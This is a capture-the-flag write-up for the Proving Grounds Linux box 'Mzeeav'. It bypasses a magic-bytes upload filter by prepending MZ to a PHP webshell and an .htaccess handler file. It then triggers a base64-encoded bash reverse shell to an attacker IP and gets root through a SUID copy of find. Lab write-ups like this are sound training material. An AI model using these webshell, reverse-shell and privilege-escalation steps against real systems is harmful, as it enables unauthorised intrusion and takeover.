---
machine: Mzeeav
platform: Proving Grounds
category: Linux
difficulty: Medium
tags: [file-upload, magic-bytes-bypass, htaccess, acl, gtfobins, suid]
date: 2026-08-20
status: retired
summary: A Debian box hosting a "file scanner" web app that only accepts uploads whose leading bytes look like a Windows PE — testing a magic-bytes upload-filter bypass and an .htaccess handler trick for a web foothold, followed by an extended-ACL directory grant and a SUID-binary GTFOBins abuse for the path to root.
---

## Enumeration

nmap scan:

```bash
┌──(kali㉿kali)-[~/oscp/mzeeav]
└─$ nmap-full 192.168.117.33
[*] Running fast port discovery on 192.168.117.33...
[sudo] password for kali: 
[*] Open ports: 22,80
[*] Running full scan on 192.168.117.33...
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-20 15:27 -0400
Nmap scan report for 192.168.117.33
Host is up (0.034s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: MZEE-AV - Check your files
|_http-server-header: Apache/2.4.56 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.40 seconds
```

Since we only have the webapp we can run a feroxbust:

```text
404      GET        9l       31w      268c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      271c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       35l      137w     1321c http://target/listing.php
301      GET        9l       28w      301c http://target/upload => http://target/upload/
200      GET        1l        4w       22c http://target/upload.php
301      GET        9l       28w      302c http://target/backups => http://target/backups/
200      GET     1213l     7233w   601221c http://target/backups/backup.zip
200      GET       51l      152w     1482c http://target/
404      GET        0l        0w      268c http://target/sandbox
```

The listing.php shows:

```text
List checked files:  
  
index.html - MD5: 01238cd7fc4a9f3c01dc6b51dbbce222 - seems to be clean!  
wget.exe - MD5: 41db24a16304419f48e79c1c878694ad - seems to be clean!  
whoami.exe - MD5: e4f1b4e581fb998977d4c9c9080d35f6 - seems to be clean!  
  

Check your PE-files with the online AV engine. [Home](http://target/index.html)
```

We can download the backup.zip from /backups/backup.zip

We can read the upload.php logic

```php
─$ cat upload.php 
<?php

/* Get the name of the uploaded file */
$filename = $_FILES['file']['name'];

/* Choose where to save the uploaded file */
$tmp_location = "upload/file.tmp";
$location = "upload/".$filename;


/* Move the file temporary */
move_uploaded_file($_FILES['file']['tmp_name'], $tmp_location);



/* Check MagicBytes MZ PEFILE 4D5A*/
$F=fopen($tmp_location,"r");
$magic=fread($F,2);
fclose($F);
$magicbytes = strtoupper(substr(bin2hex($magic),0,4)); 
error_log(print_r("Magicbytes:" . $magicbytes, TRUE));

/* if its not a PEFILE block it - str_contains onlz php 8*/
//if ( ! (str_contains($magicbytes, '4D5A'))) {
if ( strpos($magicbytes, '4D5A') === false ) {
        echo "Error no valid PEFILE\n";
        error_log(print_r("No valid PEFILE", TRUE));
        error_log(print_r("MagicBytes:" . $magicbytes, TRUE));
        exit ();
}


rename($tmp_location, $location);



?>

```

The code effectively checks whether the first two bytes match 4D5A:

```php
(str_contains(strtoupper(substr(bin2hex(fread(fopen($tmp_location,"r"),2)),0,4)), '4D5A'))
```

## Foothold

This means we can attempt to upload a php webshell with these headers and potentially have it accepted by the site.

We can see from the accepted wget.exe binary (which we also retrieved from the backup.zip) an example of the leading bytes we want:

```bash
──(kali㉿kali)-[~/…/var/www/html/upload]
└─$ xxd wget.exe| head
00000000: 4d5a 9000 0300 0000 0400 0000 ffff 0000  MZ..............
```

We will use this sed and xxd command to accomplish this:

```bash
xxd -p yourfile | sed 's/^/4d5a/' | xxd -r -p > tmpfile && mv tmpfile yourfile   
```

First we create a file with a php reverse shell:

```php
<?php echo system($_GET['cmd']); ?>
```

We find that this worked:

```bash
┌──(kali㉿kali)-[~/oscp/mzeeav]
└─$ xxd -p wget.php | sed 's/^/4d5a/' | xxd -r -p > tmpfile && mv tmpfile wget.php   

┌──(kali㉿kali)-[~/oscp/mzeeav]
└─$ xxd wget.php | head
00000000: 4d5a 0a3c 3f70 6870 2065 6368 6f20 7379  MZ.<?php echo sy
00000010: 7374 656d 2824 5f47 4554 5b27 636d 6427  stem($_GET['cmd'
00000020: 5d29 3b20 3f3e 0a                        ]); ?>.
```

We can upload a php 8 .htaccess file with MZ prepended to it along with our wget.php webshell (also with MZ prepended).

```bash
┌──(kali㉿kali)-[~/oscp/mzeeav]
└─$ cat .htaccess 
MZ
AddHandler application/x-httpd-php80 .php .tmp .php8 .phtml .exe

┌──(kali㉿kali)-[~/oscp/mzeeav]
└─$ cat wget.php 
MZ
<?php echo system($_GET['cmd']); ?>
```

After that we can navigate to /upload/wget.php and pass our url encoded bash reverse shell in the `?cmd=` parameter:

```text
echo%20L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNDUuMTUxLzIyIDA%2BJjE%3D%20%7C%20base64%20-d%20%7C%20bash
```

```bash
curl http://192.168.117.33/upload/wget.php?cmd=echo%20L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNDUuMTUxLzIyIDA%2BJjE%3D%20|%20base64%20-d%20|%20bash

┌──(kali㉿kali)-[~/oscp/mzeeav]
└─$ sudo penelope -p 22
[sudo] password for kali: 
[+] Listening for reverse shells on 0.0.0.0:22 -> 127.0.0.1 • 10.0.2.15 • 192.168.45.151
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => mzeeav 192.168.117.33 Linux-x86_64 👤 www-data(33) 😍️ Session ID <1>
[+] ⭐ Agent deployed via /usr/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
[+] Session log: /home/kali/.penelope/sessions/mzeeav~192.168.117.33-Linux-x86_64/2026_08_20-16_43_40-134-www-data(33).log
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@mzeeav:/var/www/html/upload$ whoami
www-data
```

## Privilege Escalation

Upon navigating to the /home directory we see avuser has `drwxrwxr-x+` which means theres an extended access control list present.

```bash
www-data@mzeeav:/home$ getfacl avuser
# file: avuser
# owner: avuser
# group: avuser
user::rwx
user:www-data:rwx
group::r-x
mask::rwx
other::r-x
```

We see we have full read write over this directory from the acl

We gather the local.txt from avuser's home directory.

Interesting findings:
We find this file while listing SUIDs:

```bash
www-data@mzeeav:/opt$ ls -lah
total 312K
drwxr-xr-x  2 root root 4.0K Nov 14  2023 .
drwxr-xr-x 18 root root 4.0K Nov 13  2023 ..
---s--s--x  1 root root 304K Nov 14  2023 fileS
```

If we run --help on the mysterious file:

```bash
www-data@mzeeav:/opt$ ./fileS --help
Usage: ./fileS [-H] [-L] [-P] [-Olevel] [-D debugopts] [path...] [expression]

default path is the current directory; default expression is -print
expression may consist of: operators, options, tests, and actions:
operators (decreasing precedence; -and is implicit where no others are given):
      ( EXPR )   ! EXPR   -not EXPR   EXPR1 -a EXPR2   EXPR1 -and EXPR2
      EXPR1 -o EXPR2   EXPR1 -or EXPR2   EXPR1 , EXPR2
positional options (always true): -daystart -follow -regextype

normal options (always true, specified before other expressions):
      -depth --help -maxdepth LEVELS -mindepth LEVELS -mount -noleaf
```

If we lookup the output of this file we see that it matches with `find` binary.

Given that we know this is a SUID and `find` is a notorious gtfobin, we can look up find on gtfobins:

```bash
www-data@mzeeav:/opt$ ./fileS . -exec /bin/sh -p \; -quit
# whoami
root
```

We now have root and we have compromised the box.  We can collect the proof.txt from the /root directory.
